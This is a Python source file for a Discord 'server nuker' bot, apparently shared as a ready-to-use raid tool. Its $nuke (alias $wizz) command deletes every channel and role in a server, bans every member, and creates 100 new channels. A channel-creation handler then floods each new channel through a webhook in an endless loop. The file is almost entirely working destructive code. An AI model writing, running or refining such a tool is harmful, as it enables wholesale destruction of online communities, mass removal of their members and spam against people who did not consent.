import discord
import colorama
from colorama import Fore as F, Style as S
from discord.ext import commands
import os
colorama.init()

m = F.MAGENTA
y = F.LIGHTYELLOW_EX

os.system('title @AntiServerNuker')


print(f'''
{m}                     ___                      
{m}                    (   )      .-.            
{m}  .---.   ___ .-.    | |_     ( __) 
{m} / .-, \ (   )   \  (   __)   (''") 
{m}(__) ; |  |  .-. .   | |       | |  
{m}  .'`  |  | |  | |   | | ___   | |  
{m} / .'| |  | |  | |   | |(   )  | |  
{m}| /  | |  | |  | |   | | | |   | |   
{m}; |  ; |  | |  | |   | ' | |   | | 
{m}' `-'  |  | |  | |   ' `-' ;   | |  
{m}`.__.'_. (___)(___)   `.__.   (___){y}Made by Anti
{m}                                                                                          
''')
anti = commands.Bot(command_prefix='$', intents = discord.Intents.all())

TOKEN = input(f'{y}[{m}>{y}] Enter Bot Token:{m}')
os.system('cls')
def main():
    ()
    headers = {
        "authorization" : TOKEN
    }
CHANNEL = input(f'{y}[{m}>{y}] Input Channel Name:{m} ')
SPAM = input(f'{y}[{m}>{y}] Input Text To Spam:{m} ')
NAME = input(f'{y}[{m}>{y}] Input Webhook Name:{m} ')
BAN = input(f'{y}[{m}>{y}] Input Ban Reason:{m} ')
os.system('cls')

@anti.event
async def on_ready():
    await anti.change_presence(status=discord.Status.idle, activity=discord.Game('@Anti'))
print(f'''
{m}                     ___                      
{m}                    (   )      .-.            
{m}  .---.   ___ .-.    | |_     ( __) 
{m} / .-, \ (   )   \  (   __)   (''") 
{m}(__) ; |  |  .-. .   | |       | |  
{m}  .'`  |  | |  | |   | | ___   | |  
{m} / .'| |  | |  | |   | |(   )  | |  
{m}| /  | |  | |  | |   | | | |   | |   
{m}; |  ; |  | |  | |   | ' | |   | | 
{m}' `-'  |  | |  | |   ' `-' ;   | |  
{m}`.__.'_. (___)(___)   `.__.   (___){y}Made by Anti
{m}  
{y}$wizz {m}| {y}Server Raid                                                                                        
''')
anti.remove_command('help')

@anti.command(aliases=['wizz'])
async def nuke(ctx):
  os.system('cls')
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f'{y}[{m}>{y}] Channel Deleted')
    except Exception as e:
      print(f'{y}[{m}>{y}] Failed To Delete Channel')
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f'{y}[{m}>{y}] Role Deleted')
    except Exception as e:
      print(f'{y}[{m}>{y}] Failed To Delete Role')
  for member in ctx.guild.members:
    try:
      await member.ban(reason=BAN)
      print(f'{y}[{m}>{y}] Member Banned')
    except Exception as e:
      print(f'{y}[{m}>{y}] Failed To Ban Member')
  for i in range(100):
    await ctx.guild.create_text_channel(CHANNEL)
    print(f'{y}[{m}>{y}] Channel Created')
 
@anti.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name=NAME)
  while True:
    await web.send(SPAM)
    await channel.send(SPAM)

anti.run(TOKEN)
